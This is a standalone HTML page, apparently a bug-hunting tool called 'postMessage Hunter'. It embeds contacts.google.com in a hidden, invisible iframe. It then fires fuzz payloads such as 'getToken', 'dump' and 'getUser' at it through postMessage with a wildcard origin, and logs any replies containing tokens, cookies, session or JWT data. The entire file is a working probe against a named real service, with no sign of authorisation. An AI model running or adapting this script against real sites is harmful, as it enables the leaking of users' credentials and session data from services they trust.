<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Advanced postMessage Hunter</title>
<style>
body { font-family: Arial; text-align:center; margin-top:50px; }
button { padding:15px 25px; font-size:16px; }
pre { background:#111; color:#0f0; padding:10px; text-align:left; width:90%; margin:auto; height:300px; overflow:auto;}
</style>
</head>
<body>

<h2>postMessage Hunter</h2>
<button id="start">Start Scan</button>

<pre id="log">Waiting...</pre>

<script>
const TARGET = "https://contacts.google.com/other";

const log = (msg) => {
    const el = document.getElementById("log");
    el.innerText += "\n" + msg;
    el.scrollTop = el.scrollHeight;
};

let iframe;

// 🔥 Smart message analyzer
function analyzeMessage(e) {
    const data = e.data;

    // skip noise
    if (!data || typeof data !== "object") return;

    const suspiciousKeys = [
        "token", "auth", "cookie", "session",
        "jwt", "email", "user", "profile"
    ];

    const found = suspiciousKeys.filter(k => JSON.stringify(data).toLowerCase().includes(k));

    if (found.length > 0) {
        log("🔥 POSSIBLE SENSITIVE DATA FOUND");
        log("Keys: " + found.join(", "));
        document.body.style.background = "darkred";
    }
}

// listener global
window.addEventListener("message", (e) => {
    log("\n[MSG]");
    log("Origin: " + e.origin);

    try {
        log("Data: " + JSON.stringify(e.data).slice(0, 500));
    } catch {}

    // 🚨 cross origin detection
    if (e.origin !== location.origin) {
        log("🚨 CROSS-ORIGIN MESSAGE");
    }

    analyzeMessage(e);
});

// fuzz sender
function sendFuzzMessages() {
    const payloads = [
        {cmd: "getUser"},
        {type: "auth"},
        {action: "dump"},
        {method: "getToken"},
        {request: "profile"},
        {debug: true}
    ];

    payloads.forEach((p, i) => {
        setTimeout(() => {
            try {
                iframe.contentWindow.postMessage(p, "*");
                log("[>] Sent payload: " + JSON.stringify(p));
            } catch(e) {}
        }, i * 500);
    });
}

document.getElementById("start").onclick = () => {
    log("[*] Loading target...");

    iframe = document.createElement("iframe");
    iframe.src = TARGET;
    iframe.style.width = "1px";
    iframe.style.height = "1px";
    iframe.style.opacity = "0";

    document.body.appendChild(iframe);

    setTimeout(() => {
        log("[*] Starting fuzz...");
        sendFuzzMessages();
    }, 3000);
};
</script>

</body>
</html>
